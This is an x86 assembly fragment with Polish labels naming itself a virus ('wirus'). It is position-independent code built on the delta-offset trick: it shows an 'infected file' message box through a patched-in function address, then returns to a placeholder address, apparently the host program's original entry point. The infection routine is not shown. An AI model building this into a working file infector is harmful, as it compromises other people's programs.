.intel_syntax noprefix

.global _wirus_poczatek
_wirus_poczatek:
  pushad
  call delta
delta:
  pop ebp
  sub ebp, offset delta
  push 0x0
  lea eax, [ebp + mbaTytul]
  push eax
  lea eax, [ebp + mbaTresc]
  push eax
  push 0x0
  mov eax, 0xAAAAAAAA
  call eax
  popad
  push 0xAAAAAAAA
  ret

mbaTytul:
  .asciz "Komunikat"
mbaTresc:
  .asciz "Plik zarazony"

.global _wirus_koniec
_wirus_koniec:
